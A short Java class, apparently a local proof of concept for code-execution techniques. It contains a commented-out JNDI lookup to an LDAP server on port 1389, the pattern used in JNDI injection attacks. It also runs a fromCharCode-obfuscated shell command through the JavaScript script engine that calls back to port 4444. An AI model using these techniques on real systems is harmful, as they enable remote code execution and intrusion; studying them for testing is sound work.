package com.example.demo;

import javax.naming.NamingException;
import javax.script.ScriptEngineManager;
import javax.script.ScriptException;

public class NoSpringBoot {


    public static void main(String[] args) throws NamingException, ClassNotFoundException, InstantiationException, IllegalAccessException, ScriptException {

       //  InitialContext.doLookup("ldap://192.168.1.24:1389/o=reference");


       new ScriptEngineManager().getEngineByName("JavaScript")
                .eval("java.lang.Runtime.getRuntime().exec(String.fromCharCode(104,116,116,112,32,58,52,52,52,52))");


    }
}
